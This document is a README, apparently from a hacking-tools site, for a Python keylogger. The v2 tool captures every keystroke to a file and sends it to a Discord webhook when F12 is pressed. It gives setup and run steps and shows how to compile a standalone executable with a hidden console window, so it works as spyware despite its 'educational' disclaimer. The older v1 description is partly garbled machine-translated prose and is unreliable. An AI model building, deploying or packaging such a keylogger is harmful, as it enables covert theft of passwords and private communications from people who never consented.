# v2.0 by dEEpEst 

# Keyboard Logger with Log Sending to Discord 

This Python script uses the `pynput.keyboard` and `requests` modules to capture keystrokes from the user and send them to a Discord webhook when a specific key is pressed.

Here is a detailed explanation of each part of the script:

## Dependencies:
```
import requests
from pynput.keyboard import Key, Listener
```
The script imports the `requests` module, which allows it to send HTTP requests. It also imports `Key` and `Listener` from `pynput.keyboard`, which are used for capturing keyboard input.

## Installation and Usage
### Installation
To use this script, you need to have Python installed on your machine. If you don't have Python, you can download it from the official site: https://www.python.org/downloads/.

You will also need to install the following Python packages: `requests` and `pynput`. These can be installed via pip, which is a package manager for Python. If you have Python installed, you likely have pip installed as well.

To install these packages, open a terminal window and run the following commands:
```
pip install requests
pip install pynput
```

### Usage
1. Clone this repository to your local machine.
```
git clone https://github.com/LvL23HT/KeyloogerBasic.git
```
2. Open the script with a text editor and replace the WEBHOOK_URL variable with your Discord webhook URL.
```
cd KeyloogerBasic
nano KeyloogerV2.py
```
3. Save and close the file.

4. To run the script, open a terminal window, navigate to the directory where the script is located, and then run the following command:
```
python KeyloogerV2.py
```

The script will start running and will record all keyboard input. The input is logged to a file defined by the LOG_FILE variable.

To send the log file via the Discord webhook, press the F12 key. The script will stop after sending the log file.

## Compile for Windows, Linux or macOS
PyInstaller is a program that converts Python applications into stand-alone executables, under Windows, Linux, and macOS.

If you don't have PyInstaller installed, you can install it via pip:
```
pip install pyinstaller
```

Once PyInstaller is installed, you can use it to compile your Python script into an executable file. To do this with the console window hidden, use the `--noconsole` and `--onefile` options:
```
pyinstaller --onefile --noconsole KeyloogerV2.py

```

The `--onefile` option tells PyInstaller to create a single executable file, and `--noconsole` ensures that the console window will not appear when the executable is run.

After running this command, PyInstaller will create a new directory named `dist` in the current directory. Inside the `dist` directory, you will find your executable file. You can run this file just like any other executable, and it will execute your Python script without showing a console window.

## Demo:
![WEBHOOKS](https://i.ibb.co/XZM2JLy/Screenshot-2023-08-01-10-11-42-71-572064f74bd5f9fa804b05334aa4f912.jpg)


## Global variables:
```
LOG_FILE = 'log.txt'
WEBHOOK_URL = 'YOUR_WEBHOOKS_API_HERE'
```
`LOG_FILE` is the name of the file where the keystrokes will be stored, and `WEBHOOK_URL` is the URL of the Discord webhook where the log file will be sent when the F12 key is pressed.

## Functions 

### Function write_file(key):
This function is called each time a key is pressed. It processes the key press, converts it into a string, and writes it to the log file.

### Function send_log():
This function opens the log file in binary mode, prepares it for sending as a file attachment, and then sends it to the Discord webhook URL using a POST request. It will print the HTTP response status code if the request is successful, or print an error message if it fails.

### Function on_release(key):
This function is called each time a key is released. If the key released is F12, it will call the `send_log()` function to send the log file, and then return False to stop the key listener.

## Listener:

```
with Listener(on_press=write_file, on_release=on_release) as listener:
    listener.join()
```

This starts a new `Listener` that listens for key press and key release events. It calls the `write_file(key)` function when a key is pressed and the `on_release(key)` function when a key is released.

## Disclaimer
This script was created for educational purposes and is intended to demonstrate how key logging and Discord webhook functionalities can be implemented in Python.

### IMPORTANT:

The misuse of this script could lead to the invasion of privacy or unauthorized data access, which is illegal and unethical. It's critical that you only use or modify this code if you understand the implications and potential consequences, and you have obtained explicit permission from the relevant parties.

This code should never be used for malicious purposes. The creator of this code does not condone or support any form of unauthorized or illegal use.

By using or modifying this code, you agree to assume all responsibility for any resulting consequences, and you acknowledge that the code creator cannot be held responsible for any misuse or data breaches that may occur as a result of using this code.

## License
This project is licensed under the *MIT License*. Please see the LICENSE file in the root of the repository for the full license text.

By using or modifying this code, you are agreeing to comply with the terms and conditions of this license. The MIT License is a permissive open source license that allows for reuse of the licensed material under certain conditions, primarily that the original copyright notice and disclaimer are retained and included with any distribution or publication of the material.

## Link:
Visit [Level23HackTools](https://level23hacktools.com) for more information on hacking and computer security.

Enjoy using the app!

---
# v1.0 by dEEpEst 

# KeyloogerBasic

Keylogger written in Python

## Description:

This code is a simple keylogger that records the keys you press on your keyboard and keep them in a file called 'log.txt'. Below is what each part of the code does:

IMPORT PYNPUT: This imports the Pynput module, which is a Python library to control and monitor the keyboard and mouse.

from pynput.keyboard import key, listener: This matters the specific Key and Listener classes of pynput.keyboard. Key is an enumeration that represents the special keys (such as function keys, shift, Ctrl, etc.), and Listener is a class that allows your program to listen to keyboard events.

Def on_press (Key): This is a function called every time you press a key on the keyboard. Take a single argument, which is the key that was pressed.

Write_file (Key): This function writes the key pressed in the 'log.txt' file. The file opens in addition mode ('A'), which means that the new keys will be added at the end of the file instead of overwriting the file. The pressured key becomes a chain and the quotes are deleted before writing it in the file. If an error occurs when writing the file, an error message is printed.

Def on_release (key): This is another function that is called every time you release a key on the keyboard. If the key that was released is F12, the function returns false, which stops the listener and ends the program.

with listener (on_press = on_press, on_release = on_release) as listener: this starts a listener that calls the on_press and on_ functions every time a key is pressed or released, respectively. The listener runs in a loop until it stops (for example, when the F12 key is released).

# Website:
https://level23hacktools.com/hackers/profile/1-deepest
